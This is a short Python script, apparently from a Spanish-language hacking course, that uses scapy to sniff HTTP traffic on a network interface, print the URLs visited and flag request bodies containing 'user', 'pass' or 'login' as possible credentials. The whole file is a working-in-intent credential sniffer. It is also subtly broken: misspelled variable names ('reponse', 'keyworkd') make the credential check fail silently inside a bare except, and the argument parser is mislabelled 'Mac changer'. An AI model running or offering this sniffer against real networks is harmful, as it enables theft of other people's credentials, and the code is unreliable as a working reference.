#!/usr/bin/env python3

import signal
import sys
import argparse
import scapy.all as scapy
from scapy.layers import http
from termcolor import colored

def def_handler(sig, frame):
	print(colored("Saliendo!", "red"))
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
	parser = argparse.ArgumentParser(description="Mac changer")
	parser.add_argument("-i", "--interface", required=True, dest="interface", help="Interface")
	args = parser.parse_args()
	return args.interface

def process_packet(packet):
	if not packet.haslayer(http.HTTPRequest):
		return

	url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
	print(colored(f"La URL visitada es: {url}", "blue"))

	if not packet.haslayer(scapy.Raw):
		return

	try:
		cred_keywords = ["user", "pass", "login"]
		reponse = packet[scapy.Raw].load.decode()
		for keyword in cred_keywords:
			if keyworkd in response:
				print(colored(f"Posibles credenciales: {response}\n" ,"green"))
				break
	except:
		pass

def sniff(interface):
	scapy.sniff(iface=interface, prn=process_packet, store=False)

def main():
	interface = get_arguments()
	sniff(interface)

if __name__ == "__main__":
	main()
